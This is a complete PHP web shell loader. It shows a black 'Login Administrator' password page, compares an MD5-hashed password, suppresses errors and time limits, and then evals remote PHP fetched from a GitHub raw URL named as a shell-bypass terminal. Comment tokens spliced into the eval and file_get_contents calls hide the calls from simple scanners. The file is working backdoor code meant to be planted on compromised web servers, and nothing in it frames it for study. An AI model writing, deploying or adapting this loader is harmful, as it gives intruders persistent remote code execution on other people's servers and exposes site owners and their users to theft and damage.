<?php
$password = '253b3c7365488693240a71a3a880a18c';
error_reporting(0);
set_time_limit(0);

session_start();
if (!isset($_SESSION['loggedIn'])) {
    $_SESSION['loggedIn'] = false;
}

if (isset($_POST['password'])) {
    if (md5($_POST['password']) == $password) {
        $_SESSION['loggedIn'] = true;
    }
}

if (!$_SESSION['loggedIn']): ?>

<html><head><title>Login Administrator</title></head>
  <body bgcolor="black">
    <center>
    <p align="center"><center><font style="font-size:13px" color="red" face="text-dark">
    <form method="post">
      <input type="password" name="password">
      <input type="submit" name="submit" value="  Login"><br>
    </form>
  </body>
</html>

<?php
exit();
endif;
?>
<?php eval/**_**/(urldecode('%3f%3e') .file_get_contents/**_**/(urldecode/**_**/('https://raw.githubusercontent.com/mangoleh098/bypassshellterminal/refs/heads/main/bypasserv.php'))); ?>
